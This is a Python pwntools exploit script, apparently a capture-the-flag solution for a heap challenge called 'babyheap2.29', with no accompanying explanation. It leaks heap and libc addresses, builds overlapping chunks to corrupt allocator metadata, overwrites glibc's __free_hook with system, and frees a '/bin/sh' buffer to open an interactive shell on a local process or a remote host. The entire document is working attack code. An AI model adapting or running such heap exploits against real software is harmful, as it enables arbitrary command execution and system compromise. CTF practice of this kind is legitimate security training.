#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./babyheap2.29"
elf=ELF(pwn_file)
libc=ELF("./bc.so.6")
heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("192.168.201.21",1904)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def add(size):
    r.sendlineafter("Command: ","1")
    r.sendlineafter("Size: ",str(size))

def edit(idx,size,data):
    r.sendlineafter("Command: ","2")
    r.sendlineafter("Index: ",str(idx))
    r.sendlineafter("Size: ",str(size))
    r.sendafter("Content: ",data)

def show(idx):
    r.sendlineafter("Command: ","4")
    r.sendlineafter("Index: ",str(idx))
    r.recvuntil("]: ")
    return r.recvline()[:-1]

def dele(idx):
    r.sendlineafter("Command: ","3")
    r.sendlineafter("Index: ",str(idx))

add(0x30)
add(0x30)
dele(0)
dele(1)
add(0x30)
heap_add = u64(show(0).ljust(8,"\x00"))-0x260
dele(0)

for i in range(7):
    add(0xf0)

for i in range(7):
    dele(i)

for i in range(8):
    add(0x140)
add(0x10)#8

add(0x28)#9
add(0x140)#10
add(0x20)#11
for i in range(8):
    dele(i)

add(0x18)#0
libc.address = u64(show(0).ljust(8,"\x00"))-0x1e4dd0
add(0x120)#1 unsortbin
f={
    8:p64(0x171),
    0x10:p64(heap_add + 0x1350)*2,
    0x30:p64(heap_add + 0x1330)*2,
}
edit(1,0x40,fit(f,filler="\x00"))

edit(9,0x28,"a"*0x20+p64(0x170))
f={
        0xf8:p64(0x21),
        0xf8+0x20:p64(0x21),
}
edit(10,0x140,fit(f,filler="\x00",length=0x140))
dele(10)
dele(9)
add(0x260)
edit(2,0x260,p64(libc.sym["__free_hook"]-0x10)*(0x260/8))
add(0x28)
add(0x28)
edit(3,8,"/bin/sh\x00")
edit(4,8,p64(libc.sym["system"]-0x10))
dele(3)

r.interactive()






